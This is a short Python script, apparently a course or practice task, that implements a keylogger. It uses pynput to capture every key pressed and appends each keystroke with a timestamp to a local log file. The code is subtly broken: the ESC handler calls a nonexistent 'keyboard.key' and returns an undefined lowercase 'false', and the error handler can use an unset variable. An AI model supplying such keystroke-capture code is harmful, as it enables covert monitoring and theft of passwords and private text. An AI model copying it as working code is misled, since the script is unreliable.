""" task4: create a basic keylogger program that records and logs keystroks.focus on logging the keys pressed and saving them to a file."""
from pynput import keyboard
import datetime
import os

# File to store logged keystrokes
LOG_FILE = "keystrokes.log"

def on_press(key):
    """Handle key press events and log to file."""
    try:
        # Get current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Convert key to string
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            # Handle special keys (e.g., space, enter, etc.)
            key_str = str(key).replace("Key.", "")
        
        # Log the key with timestamp
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {key_str}\n")
            
    except Exception as e:
        # Log errors to avoid crashing
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] Error: {str(e)}\n")
def on_release(key):
    #Handle key release to exit on ESC.
    if key == keyboard.key.esc:
        return false #stop listener
def main():
    print("Keylogger started. Press ESC to stop.")
    print(f"Keystrokes will be logged to {LOG_FILE}")
    
    # Create listener for key presses
    with keyboard.Listener(on_press=on_press , on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # Ensure log file exists
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("Keylogger Log\n")
    main()
